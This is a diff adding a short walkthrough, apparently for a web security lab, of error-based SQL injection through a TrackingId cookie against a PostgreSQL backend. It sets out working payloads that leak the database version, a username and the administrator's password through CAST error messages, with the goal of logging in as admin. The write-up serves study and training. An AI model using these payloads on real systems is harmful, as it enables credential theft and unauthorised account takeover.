@@ -1,0 +1,24 @@
+End Task
+    1- Retrieve admin Credentials
+    2- login using administrator's Credentials
+
+1- By adding a ' Single Quote to the TrackingId Parameter in the cookies, The response from that request contains an Error indicating
+the SQL Query used to check the TrackingId Value.
+    SELECT * FROM tracking WHERE id = 'BT3ezCR0uNQQ9wpL''
+
+2- When using this payload (' AND CAST((SELECT 1) AS INT) -- -)
+    ERROR: argument of AND must be type boolean, not type integer Position: 63
+
+3- So change the payload to be (' AND CAST((SELECT 1) AS INT)=1 -- -)
+    The response status code was "200 ok" which means that this payload is a valid query
+
+4- Use this payload to know the database type and version 
+    ' AND CAST((SELECT version()) AS INT)=1 -- -
+    "PostgreSQL 12.20 (Ubuntu 12.20-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu,
+    compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"
+
+5- Check if administrator username exists.
+    ' AND CAST((SELECT username from users limit 1) AS INT)=1-- -
+    
+6- Retrieve administrator's password
+    ' AND CAST((SELECT password from users limit 1) AS INT)=1-- -
